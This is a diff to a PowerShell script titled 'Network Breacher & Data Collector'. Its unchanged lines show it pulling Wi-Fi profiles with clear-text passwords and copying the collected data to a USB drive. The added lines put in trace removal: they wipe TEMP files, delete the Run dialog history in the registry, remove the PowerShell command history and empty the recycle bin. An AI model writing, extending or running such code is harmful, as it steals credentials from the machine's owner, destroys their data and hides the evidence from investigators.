@@ -1,5 +1,5 @@
 # ==========================================
-# Network Breacher & Data Collector
+# Network Breacher & Data Collector + Cleanup
 # ==========================================
 
 # 1. Extract WLAN profiles and clear-text passwords
@@ -29,7 +29,11 @@ if ($usb) {
     Copy-Item $path "$($usb.DriveLetter):\" -Force
 }
 
-# 6. Cleanup and exit after 15 seconds
+# 6. Wait briefly, then execute full trace removal and exit
 Start-Sleep -s 15
 Remove-Item $path -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
+Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 exit
